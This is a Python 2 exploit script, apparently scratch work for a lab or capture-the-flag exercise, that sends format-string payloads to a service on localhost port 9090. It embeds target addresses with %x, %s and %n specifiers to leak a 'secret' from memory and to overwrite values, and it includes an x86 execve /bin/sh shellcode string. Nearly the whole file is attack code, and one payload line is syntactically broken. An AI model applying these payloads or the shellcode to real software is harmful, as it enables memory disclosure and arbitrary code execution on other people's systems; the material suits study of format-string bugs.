#!/usr/bin/python

import struct 
import time
import socket
# s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(('127.0.0.1', 9090))


# padding = "\xbf\xff\xe4\x70%x-" * 30 + "-57005-" + "- %s"
# padding = "%x" * 1500 + "\n[[\n"+"%s"*10+"]]\n"
# padding = "%s" *40 +'-TESTING-' + "%s" * 2000
# ------------------------------------
# padding = "%s" *40 # this is the segfault
# padding = "\x40\xa0\x04\x08@@@@\x3e\xa0\x04\x08" + ".%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.1000x%hn%.65289x%hn" # patricks shared payload
padding = "\x08\x04\x87\xc0" + ".%x"*20 + "%n" # segfault
padding = "\xc0\x87\x04\x08" + "%x|"*4 +"AAAA" +"%x|"*4 +"AAAA" +"%x|"*4 +"AAAA" + "%s"
padding = "\xc0\x87\x04\x08" + "%x|" * 10 + "%s"
padding = "\x08\x04\x87\xc0" + "%x|" * 10 + "%s|" + "%p|" *10 + "\n\n"
padding =  "AAAA" + "|%8x" * 7 + "|%s"
padding =  "\xc0\x87\x04\x08" + "|%x" * 7 + "%s\n"
padding =  "\x5c\x78\x63\x30\x5c\x78\x38\x37\x5c\x78\x30\x34\x5c\x78\x30\x38" + "|%x" * 7 + "|%n\n"
padding =  "\x5c\x78\x34\x34\x5c\x78\x61\x30\x5c\x78\x30\x34\x5c\x78\x30\x38" + "|%x" * 7 + "|%n\n"
padding =  "%8x|"*200 
padding = "\x40\xa0\x04\x08@@@@\x3e\xa0\x04\x08" + ".%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.1000x%hn%.65289x%hn" # patricks shared payload
padding =  "%.8x	|"*23 + "\xc0\x87\x04\x08" + "%s" 
padding =  "\x40\xa0\x04\x08"+"%.8x"*24
padding = "\x5c\x78\x34\x34\x5c\x78\x61\x30\x5c\x78\x30\x34\x5c\x78\x30\x38"  + "%.8x"*22 + "%s"
padding = "\x40\xa0\x04\x08"+"%.8x"*23 + "%s"
padding = "\xe0\x87\x04\x08"+"%.8x"*23 + "%s"  ## This prints the secret
padding = "\x40\xa0\x04\x08"+"%.8x"*24 # target is a number no string format is needed (%s)
padding = "\x40\xa0\x04\x08"+"%.8x"*23 + "%n"
padding = "\x40\xa0\x04\x08"+"%x"*22 + %.100x "%n"
# %x = 4 bytes/4char
# calculate chars (address) [4bytes] + (22*4)[88] + 100x = 192 percision -> this is the nubmer used for the %n value
# number written is binary into the %n 

# padding = "\xc0\x87\x04\x08" + "%x|" * 11 + "%s\n" # this creates a segfault error 
#padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGG"+ 
#padding = "\x80\x04\x87\xc0%s"+"|%x"*10+"|%s" # not working 
#padding = "\x84\x95\x04\x08AAAAAAAAAAAAAAAAAAAAAAA\x85\x95\x04\x08BBBBBBBBBBBB\x86\x95\x04\x08AAAAAAAAAAAA\x87\x95\x04\x08" + "%x%x%x%x%x%x%x%x%8x%n" # using to actively debug
# padding = ".%x|%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%1000x.%n"
#padding = "|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%s|%n"
print "padding " + padding
print "\n"
#padding = "\xbf\xff\xe4\x70"+"|%x|" * 40 + "\n[[\n"+"%s"*10+"]]\n"
shellcode= "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
#print "shell code " + shellcode
#eip = struct.pack("I",)
payload = padding # +eip

#s.send(shellcode)
s.send(payload)
s.close()

# location of secret -
#\x08\x04\x87\xc0 # original
#\xc0\x87\x04\x08 # little edian


#\x40\xa0\x04\x08%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x%.8x|%s


#\x48\x68\xfd\xb7

#\xc0\x87\x04\x08

#0x080487c0
#0xbfffe460
#0x0804a040
